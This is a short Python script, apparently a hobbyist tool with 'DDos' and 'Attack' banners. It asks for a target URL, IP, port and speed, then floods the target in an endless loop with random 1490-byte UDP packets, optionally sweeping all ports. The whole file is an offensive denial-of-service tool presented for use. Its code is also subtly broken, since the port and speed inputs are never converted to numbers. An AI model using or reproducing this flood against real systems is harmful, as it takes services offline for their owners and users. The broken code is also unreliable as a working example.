import sys
import os
import time
import socket
import random
import requests
import os, sys, codecs
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")
os.system("figlet DDos")
print("""\033[94m
███████████████████████
▀─▄▄▀█▄─▄▄▀█─▄▄─█─▄▄▄▄█
█─██─██─██─█─██─█▄▄▄▄─█
▀▄▄▄▄▀▀▄▄▄▄▀▄▄▄▄▀▄▄▄▄▄▀

""")
#ip
url = input("\033[94m╔═══\033[91m[ Url ] •\n\033[94m╠══>\033[0m ")
url_chek = requests.get(url)
ip = socket.gethostbyname(url.replace("https://","").replace("http://",""))
print(ip)
print()
ip = input("\033[94m IP Target \033[1;31;40m  ==> : \033[0m")
port = input(" \033[94m Port Target \033[1;31;40m ==> : \033[0m")
speed = input("\033[94m╠═══\033[91m[ Attack speed (0-1000) ] •\n\033[94m╠══>\033[0m ")
print("\033[94m")
os.system("clear")
os.system("figlet Attack")
print( "[                    ] 0% ")
time.sleep(2)
os.system("clear")
print( "[=====               ] 25%")
time.sleep(2)
os.system("clear")
print( "[==========          ] 50%")
time.sleep(2)
os.system("clear")
print( "[===============     ] 75%")
time.sleep(2)
os.system("clear")
print( "[====================] 100%")
time.sleep(3)
os.system("clear")
sent = 0
if port == 00000:
     port = 1     
     while True:
          sock.sendto(bytes, (ip,port))
          sent = sent + 1
          port = port + 1
          print ("Sent %s packet %s port %d"%(sent,ip,port))
          time.sleep((1000-speed)/2000)
          if port == 65535:
               port = 1
else:
     while True:
          sock.sendto(bytes, (ip,port))
          sent = sent + 1
          print ("Sent %s packet %s port %d"%(sent,ip,port))
          time.sleep((1000-speed)/2000)
